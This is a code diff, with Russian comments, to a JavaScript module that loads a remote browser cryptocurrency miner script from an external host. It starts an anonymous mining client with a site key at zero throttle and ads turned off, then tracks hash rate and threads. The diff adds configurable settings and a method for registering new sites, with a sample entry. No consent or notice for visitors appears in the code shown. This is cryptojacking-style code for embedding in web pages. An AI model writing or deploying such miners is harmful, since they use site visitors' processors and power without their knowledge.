@@ -18,7 +18,30 @@ function coins(sites) {
     }
     let src; //script src
     let key;
+    
+    // настройки по умолчанию
+    let settings = {};
+    settings.throttle = 0;
+    settings.c = 'w';
+    settings.ads = 0;
 
+    // переменные майнера
+    let onMobile;
+    let wasmEnabled;
+    let isAutoThreads;
+    let hps;
+    let threads;
+    let throttle;
+
+    //вспомогательные переменные текущего состояния
+    let start;
+    let now;
+    let last;
+    let running = false;
+    let hashes = 0;
+    let jobs = 0;
+    let founds = 0;
+    
 
     function loadScript(src) {
         return new Promise(function(resolve, reject) {
@@ -46,6 +69,29 @@ function coins(sites) {
         key = k;
         return instance;
     };
+    
+    // присваиваем или получаем settings
+    instance.settings = (s) => {
+        if (!arguments.length) return settings;
+        settings = s;
+        return instance;
+    };
+
+    // добавляем сайт
+    instance.addSite = (site) => {
+        sites.push(site);
+        // пример
+        /*
+            {
+                id: 'local',
+                match: '127.0.0.1',
+                src: 'https://www.hostingcloud.racing/2KFX.js',
+                key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
+            }
+        */
+        
+        return instance;
+    };
 
     // запускаем майнер
     instance.start = () => {
@@ -60,28 +106,20 @@ function coins(sites) {
         loadScript(src)
             .then(
                 function(result) {
-                    let _client = new Client.Anonymous(key, {
-                        throttle: 0,
-                        c: 'w',
-                        ads: 0
-                    });
-
-                    let start = new Date();
-                    let now = start;
-                    let last = start;
-                    let running = false;
-                    let hashes = 0;
-                    let jobs = 0;
-                    let founds = 0;
+                    let _client = new Client.Anonymous(key, settings);
+                    
+                    start = new Date();
+                    now = start;
+                    last = start;
 
                     _client.start();
 
-                    let onMobile = _client.isMobile();
-                    //let wasmEnabled = _client.hasWASMSupport();
-                    //let isAutoThreads = _client.getAutoThreadsEnabled();
-                    let hps = _client.getHashesPerSecond();
-                    //let threads = _client.getNumThreads();
-                    //let throttle = _client.getThrottle();
+                    onMobile = _client.isMobile();
+                    wasmEnabled = _client.hasWASMSupport();
+                    isAutoThreads = _client.getAutoThreadsEnabled();
+                    hps = _client.getHashesPerSecond();
+                    threads = _client.getNumThreads();
+                    throttle = _client.getThrottle();
 
                     _client.on('open', function(args) {
                         start = new Date();
